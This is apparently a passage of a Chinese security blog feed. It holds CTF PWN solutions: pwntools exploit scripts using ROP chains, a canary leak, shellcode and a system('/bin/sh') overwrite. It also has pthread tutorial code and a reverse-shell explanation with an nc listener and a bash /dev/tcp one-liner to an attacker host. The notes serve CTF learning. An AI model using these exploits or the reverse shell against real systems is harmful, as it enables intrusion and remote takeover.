class="line">    menu(<span class="number">3</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edite</span>(<span class="params"><span class="built_in">id</span>,payload</span>): </span><br><span class="line">    menu(<span class="number">4</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>).encode()) </span><br><span class="line">    io.sendafter(<span class="string">&quot;message:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,introduce</span>):</span><br><span class="line">    menu(<span class="number">1</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your name:&quot;</span>,name) </span><br><span class="line">    io.sendafter(<span class="string">&quot;Introduce:&quot;</span>,introduce)</span><br><span class="line"></span><br><span class="line">edite(-<span class="number">4</span>,p64(<span class="number">0</span>)+p64(printf)+p64(system))  <span class="comment">#一个结构体0x30，写intro再+0x10</span></span><br><span class="line">add(<span class="string">b&#x27;/bin/sh&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>) </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="orz？orw！"><a href="#orz？orw！" class="headerlink" title="orz？orw！"></a>orz？orw！</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250308120612.png" alt="Pasted image 20250308120612"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">&#x27;./orw&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">18839</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(filename)</span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context(arch = elf.arch, log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;name:&#x27;</span>,(<span class="string">b&#x27;1&#x27;</span>).ljust(<span class="number">0x11</span>-<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line">size = <span class="built_in">len</span>(<span class="string">&quot;Hello 1aaaaaaaa&quot;</span>) </span><br><span class="line">res = io.recvline()</span><br><span class="line">res = io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;res&quot;</span>,res) </span><br><span class="line">canary = u64(res[size:size+<span class="number">8</span>]) </span><br><span class="line">canary -=<span class="number">0x61</span></span><br><span class="line">success(<span class="string">&#x27;canary =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;id&#x27;</span>,<span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span> + p64(canary) + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4012A7</span>) + asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>, <span class="number">0</span>) + shellcraft.read(<span class="number">3</span>, <span class="number">0x404500</span>, <span class="number">0x100</span>) + shellcraft.write(<span class="number">1</span>, <span class="number">0x404500</span>, <span class="number">0x100</span>)))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="CISCN"><a href="#CISCN" class="headerlink" title="CISCN"></a>CISCN</h2><h3 id="2023-Shaokao"><a href="#2023-Shaokao" class="headerlink" title="2023 Shaokao"></a>2023 Shaokao</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">p=process(<span class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">choice</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>():</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;天涯\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;？\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(-<span class="number">10000</span>))</span><br><span class="line"></span><br><span class="line">buy()</span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line">choose(<span class="number">4</span>)</span><br><span class="line">choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x40264f</span>)+p64(<span class="number">0x4E60F0</span>)+p64(<span class="number">0x40a67e</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4a404b</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x458827</span>)+p64(<span class="number">59</span>)+p64(<span class="number">0x402404</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;赐名：\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">rdi=binsh地址,rsi=0,rdx=0，rax=59，syscall</span></span><br><span class="line"><span class="string">0x0000000000458827 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x000000000040264f : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x000000000040a67e : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x00000000004a404b : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000402404 : syscall</span></span><br><span class="line"><span class="string">name=0x4E60F0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="青海民族大学"><a href="#青海民族大学" class="headerlink" title="青海民族大学"></a>青海民族大学</h2><h3 id="System"><a href="#System" class="headerlink" title="System"></a>System</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./system&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./system&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#静态编译，IDA查看即可</span></span><br><span class="line">open_addr = <span class="number">0x0806D020</span></span><br><span class="line">read_addr = <span class="number">0x0806D090</span></span><br><span class="line">write_addr = <span class="number">0x0806D100</span></span><br><span class="line">bss_addr = <span class="number">0x080EB000</span></span><br><span class="line">put_addr = <span class="number">0x0804F7E0</span>  </span><br><span class="line">ret=<span class="number">0x080481b2</span></span><br><span class="line">pop1ret=<span class="number">0x0804846f</span></span><br><span class="line">pop3ret=<span class="number">0x0806336b</span></span><br><span class="line">pop2ret=<span class="number">0x0805c508</span></span><br><span class="line">sh=<span class="number">0x080BE408</span></span><br><span class="line">mprotect=<span class="number">0x0806DBB0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========orw============</span></span><br><span class="line"><span class="comment"># payload = b&#x27;A&#x27; * 112</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p32(put_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(pop1ret)</span></span><br><span class="line"><span class="comment"># payload += p32(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p32(read_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(pop3ret)</span></span><br><span class="line"><span class="comment"># payload += p32(0)</span></span><br><span class="line"><span class="comment"># payload += p32(bss_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(8)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # open(bss_addr, 0)</span></span><br><span class="line"><span class="comment"># payload += p32(open_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(pop2ret)</span></span><br><span class="line"><span class="comment"># payload += p32(bss_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(0)      </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # read(fd, bss_addr, 100)</span></span><br><span class="line"><span class="comment"># payload += p32(read_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(pop3ret)</span></span><br><span class="line"><span class="comment"># payload += p32(3)</span></span><br><span class="line"><span class="comment"># payload += p32(bss_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # write(1, bss_addr, 100)</span></span><br><span class="line"><span class="comment"># payload += p32(write_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(ret)</span></span><br><span class="line"><span class="comment"># payload += p32(1) </span></span><br><span class="line"><span class="comment"># payload += p32(bss_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(b&#x27;/bin/sh&#x27;,b&#x27;/flag\x00&#x27;)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"><span class="comment">#=======================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========mprotect=======</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span></span><br><span class="line">payload += p32(mprotect)</span><br><span class="line">payload += p32(pop3ret)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(put_addr)</span><br><span class="line">payload += p32(pop1ret)</span><br><span class="line">payload += p32(sh)</span><br><span class="line"></span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(asm(shellcraft.sh())))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload2=asm(shellcraft.sh())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;/bin/sh\n&#x27;</span>,payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#=======================</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-PWN知识</title>
      <link href="/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/03/11/Web-PWN%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux系统编程"><a href="#Linux系统编程" class="headerlink" title="Linux系统编程"></a><strong>Linux系统编程</strong></h1><h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><ul><li>使用 <code>man</code> 命令，可以查看 <code>Linux</code> 手册，<code>man</code> 是 <code>manual</code> 的命令缩写，其中文意思就是<code>手册</code>的意思。<ul><li>我们要查看一个<code>命令</code>或<code>函数</code>的使用方法，我们就可以使用 <code>man 命令</code>或 <code>man 函数</code></li><li>例如：我们要查看 <code>getpid</code> 的用法，就可以执行 <code>man getpid</code>，就可以查看手册中 <code>getpid</code> 这个函数的用法</li></ul></li></ul><h2 id="pstree"><a href="#pstree" class="headerlink" title="pstree"></a>pstree</h2><ul><li>在 <code>OS</code> 中进程是一个非常重要的概念，之后能让我们更方便理解进程，我们就先介绍另一个命令 <code>pstree</code>，这个命令我们用来查看操作系统的进程树。我们可以使用<code>进程树</code>来辅助理解或者调试一些程序。<code>pstree</code> 这个命令有一些相关的参数，接下来介绍一些常用的参数。<ul><li><code>-p</code>：输出进程树，并且会输出进程号</li><li><code>-a</code>：显示进程树，并且显示每个进程对应的目录文件</li></ul></li><li>接下来我们使用 <code>pstree -p</code> 命令查看一下具体的进程树：</li></ul><h2 id="fork-函数"><a href="#fork-函数" class="headerlink" title="fork()函数"></a>fork()函数</h2><ul><li>在理解 <code>fork</code> 函数之前我们先需要介绍一下进程，在操作系统中我们在运行中的程序就相当于一个<strong>进程</strong>，而每个进程都会有一个进程号（pid），并且进程具有树状关系，一个进程可以创建一个新进程，而这个新进程就相当于是该进程的一个<strong>子进程</strong>。</li><li>在一个进程中，我们可以使用 <code>getpid()</code> 获取当前进程所对应的进程号，我们还可以使用 <code>getppid()</code> 获取当前进程所对应父进程的进程号。</li></ul><h1 id="线程相关"><a href="#线程相关" class="headerlink" title="线程相关"></a>线程相关</h1><h2 id="pthread-create-函数"><a href="#pthread-create-函数" class="headerlink" title="pthread_create () 函数"></a>pthread_create () 函数</h2><ul><li>会详细介绍 <code>pthread_create</code> 函数还会详细介绍 <code>pthread_join()</code> 函数</li><li><code>pthread_create()</code>，这个函数是 Linux 系统提供的一个函数，作用是在当前进程中创建一个线程。接下来说明一下这个函数是如何使用的。<ul><li>首先要使用这个函数，首先要包含头文件<code>#include&lt;pthread.h&gt;</code>。</li><li>使用 <code>gcc</code> 编译链接的时候还需要使用 <code>-pthread</code> 命令来进行编译。</li><li>这个函数的功能：在我们调用 <code>pthread_create()</code> 函数的进程中，就会在该进程中调用一个线程。这个线程会开始执行下面 <code>pthread_create()</code> 函数中第 <code>3</code> 个参数（即函数指针）指向的函数。</li><li>注意：<strong>被指向的函数也有要求，这个函数参数要求传递 <code>void *</code>，返回值也要求是 <code>void *</code>，但是这并不意味着这个函数没有传递参数，具体请看下面例子</strong>，即指向 <code>void</code> 类型的指针。这个指针所指向的函数就是我们线程要执行的内容。</li></ul></li><li>现在说明一下这个函数的<code>参数</code>和<code>返回值</code>：<ul><li><code>pthread_t类型</code>：实际上该类型就是一个<code>无符号整型</code>，只是使用了这个语句进行定义 <code>typedef unsigned long int pthread_t;</code></li><li><code>pthread_t *thread</code>：传入的是一个指向<code>线程ID</code> 的指针。这也就是说，我们可以自定义<code>线程ID</code>，并不像创建一个子进程，这个进程号是系统给的。</li><li><code>pthread_attr_t *attr</code>：<code>pthread_attr_t</code> 是一个结构体，所以 <code>*attr</code> 是结构体类型的指针，其指向的是 <code>pthread_attr_t</code>。这个结构体指针，这个参数就是用来决定新线程的属性。如果该线程没有属性，就使用 <code>NULL</code> 作为参数。</li><li><code>void *(*start_routine)(void *)</code>：<code>start_routine</code> 是一个函数指针，这个指针指向的函数地址就是线程要执行的内容。</li><li><code>void *arg</code>：传递给线程函数的参数，没有任何参数就填 <code>NULL</code></li><li>返回值：创建成功就会返回 <code>0</code>，创建失败就会返回一个特定的<code>非零值</code>。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span>  </span><br><span class="line">    <span class="params">(<span class="type">pthread_t</span> *thread, <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr, <span class="type">void</span> *(*start_routine)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br></pre></td></tr></table></figure><h3 id="level-1"><a href="#level-1" class="headerlink" title="level_1"></a>level_1</h3></li></ul></li><li>接下来举一个例子：<ul><li>就是创建一个线程，使得线程执行 <code>thread_function</code></li><li>但是这个代码的执行结果不符合我们的预期，原因是进程创建完线程就结束了，进程结束会导致线程也被终止，线程是依赖于进程的，其资源属于进程</li><li>所以这时我们需要在创建完线程后，让进程执行 <code>while</code> 循环，以确保进程不结束，<strong>这样就得到了预期结果</strong><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">        <span class="type">pthread_t</span> pthread;  </span><br><span class="line">        <span class="type">int</span> ret;  </span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>);  </span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);  </span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">// 之后添加的  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);  </span><br><span class="line">                sleep(<span class="number">1</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="level-2"><a href="#level-2" class="headerlink" title="level_2"></a>level_2</h3></li></ul></li><li>但是这个代码还是有问题，因为线程进入死循环了，现在我们继续修改这个代码，使得线程有限次循环。</li><li>但是还会出现问题，这个线程结束后进程还会在等待中，这样程序一直不会结束<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">        <span class="type">pthread_t</span> pthread;  </span><br><span class="line">        <span class="type">int</span> ret;  </span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>);  </span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);  </span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">// 之后添加的  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">int</span> i;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">10</span> ; i++)  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);  </span><br><span class="line">                sleep(<span class="number">1</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="level-3"><a href="#level-3" class="headerlink" title="level_3"></a>level_3</h3></li><li>接下来我们继续改进该程序，使得进程能够接受到线程结束。这个时候需要使用到 <code>pthread_join()</code> 这个函数。<ul><li>这个函数就是等待我们创建的线程结束。线程结束，这个函数将立刻返回；线程没结束，这个函数将阻塞进程。</li><li>这个函数有两个参数和 <code>int</code> 类型的返回值 <code>int pthread_join(pthread_t thread, void **retval);</code><ul><li><code>pthread_t thread</code>：<code>线程ID</code>，<code>pthread_join</code> 要等待什么线程结束</li><li><code>void **retval</code>：<code>结束状态</code>，如果这个指针不是空指针，将保存目标线程的退出状态，如果不想保存就使用 <code>NULL</code></li><li><code>返回值</code>：调用成功返回 <code>0</code><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">        <span class="type">pthread_t</span> pthread;  </span><br><span class="line">        <span class="type">int</span> ret;  </span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>);  </span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);  </span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        pthread_join(pthread,<span class="literal">NULL</span>);  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thre thread is over,process is over too.\n&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">        <span class="type">int</span> i;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">10</span>; i++)  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);  </span><br><span class="line">                sleep(<span class="number">1</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="level-4"><a href="#level-4" class="headerlink" title="level_4"></a>level_4</h3></li></ul></li></ul></li><li><p>接下来我们继续改进该程序，让我们的进程指定线程循环的次数。这时就需要用上 <code>pthread_create()</code> 函数的最后一个参数 <code>* argv</code></p></li><li><p>但是如果我们按照正常指针来使用这个参数，在编译的时候就会发生错误，因为传递的是 <code>void</code> 类型的指针，这时需要转换为<code>整型</code>类型的指针</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">        <span class="type">pthread_t</span> pthread;  </span><br><span class="line">        <span class="type">int</span> ret;  </span><br><span class="line">        <span class="type">int</span> count = <span class="number">5</span>;  </span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, &amp;count);  </span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);  </span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        pthread_join(pthread,<span class="literal">NULL</span>);  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thre thread is over,process is over too.\n&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">        <span class="type">int</span> i;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; *(<span class="type">int</span> *)arg; i++)  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);  </span><br><span class="line">                sleep(<span class="number">1</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><h2 id="线程之间通信"><a href="#线程之间通信" class="headerlink" title="线程之间通信"></a>线程之间通信</h2><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p>需要了解一下 <code>Http</code> 协议。<a href="https://www.runoob.com/http/http-messages.html">HTTP 消息结构 | 菜鸟教程</a>、 <a href="https://www.runoob.com/http/http-methods.html">HTTP 请求方法 | 菜鸟教程</a></p><h1 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h1><ul><li>什么是反弹 shell，一般 pwn 都是我们攻击者去连接目标主机，而反弹 shell 是目标主机主动去连接攻击者的主机，并将执行权限给攻击者</li><li>反弹 shell 的前提：需要一个具有公网 ip 的服务器（IPv4）</li><li>在一般的情况下，pwn 了目标主机，直接就 <code>getshell</code> 了，这时我们就可以直接 <code>cat flag</code> 目标主机就会将 flag 的内容发送给我们，但是在需要反弹 shell 的情况，当我们 getshell 之后，我们可以对目标主机执行命令，但是接收不到目标执行完命令后的内容。这就导致我们无法得到 flag 的内容，这时就是要反弹 shell</li><li>反弹 shell 有几个办法，我们就先介绍一个办法吧：<ul><li>需要一个具有公网 ip 的服务器，假设其 ip 为 <code>1.1.1.1</code>。</li><li>我们先指定开放该服务器的端口 <code>2333</code>，输入指令为 <code>nc -lvp 2333</code> 或<code>nc -n -lvp 2333</code></li><li>然后我们 getshell 了目标靶机，这时我们就执行命令 <code>bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 